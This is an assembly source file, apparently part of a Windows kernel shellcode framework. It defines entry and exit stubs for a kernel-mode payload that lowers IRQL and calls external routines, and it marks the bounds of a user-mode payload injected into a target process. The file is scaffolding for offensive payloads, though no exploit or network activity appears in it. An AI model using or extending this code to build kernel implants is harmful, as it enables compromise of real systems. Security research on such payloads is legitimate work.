;;
;;	Enter / Leave Points For UserMode / KernelMode
;;

global EnterKmMode
global LeaveKmMode
global _EnterUmMode
global _LeaveUmMode

segment .text$A

;;
;; ENTRYPOINT OF OUR SHELLCODE. CALLED FROM
;; KERNEL MODE.
;;
EnterKmMode:

	;;
	;; Locate the start of our code, and create
	;; some shadow stack space.
	;;

	%ifidn __OUTPUT_FORMAT__, win32
		incbin	'source/asm/get_pos.x86.bin'	
		push	ebp
		mov	ebp, esp
	%else
		incbin	'source/asm/get_pos.x64.bin'
		push	rsi
		mov	rsi, rsp
		and	rsp, 0FFFFFFFFFFFFFFF0h
		sub	rsp, 020h
	%endif

	;;
	;; Check the current IRQL Level. If we
	;; are not PASSIVE_LEVEL, try and get
	;; ourselves at a lower IRQL with
	;; work items.
	;;
	;; ARG 1 : Buffer to Kernel Payload
	;; ARG 2 : Length of Kernel Payload
	;;

	%ifidn __OUTPUT_FORMAT__, win32
		extern	_KmEntryPoint
		extern	_IrqlLowerIrql

		push	0x41414141
		push	eax

		call	_IrqlLowerIrql
		cmp	eax, 1
		je	EndOfCode
		call	_KmEntryPoint
	%else
		extern	KmEntryPoint
		extern	IrqlLowerIrql

		push	rax
		pop	rcx
		push	0x41414141
		pop	rdx

		call	IrqlLowerIrql
		cmp	rax, 1
		je	EndOfCode
		call	KmEntryPoint
	%endif

EndOfCode:
	;;
	;; Restores the original stack, and 
	;; returns back to the caller.
	;;

	%ifidn __OUTPUT_FORMAT__, win32	
		leave;
	%else
		mov	rsp, rsi;
		pop	rsi;
	%endif

	ret


segment .text$D

;;
;; ENTRYPOINT OF OUR USERMODE. CALLED IN THE
;; TARGET PROCESS AND USED AS A WAY TO FIND 
;; THE USERMODE LENGTH.
;;
_EnterUmMode:
	%ifidn __OUTPUT_FORMAT__, win32
		push	ebp
		mov	ebp, esp
	%else
		push	rsi
		mov	rsi, rsp
		and	rsp, 0FFFFFFFFFFFFFFF0h
		sub	rsp, 020h
	%endif

	%ifidn __OUTPUT_FORMAT__, win32
		extern	_UmEntryPoint
		call	_UmEntryPoint
		leave;
	%else
		extern	UmEntryPoint
		call	UmEntryPoint
		mov	rsp, rsi;
		pop 	rsi;
	%endif

	ret

segment .text$G

;;
;; LEAVEPOINT OF OUR USERMODE. CALLED AND
;; USED AS A WAY TO FIND THE USERMODE LENGTH.
;;
_LeaveUmMode:
	nop


segment .text$H

;;
;; LEAVEPOINT OF OUR KERNELMODE. IS NOT 
;; CALLED AND USED AS A WAY TO FIND THE
;; KERNELMODE LENGTH.
;;
LeaveKmMode:
	int3
	int3
	int3
	int3
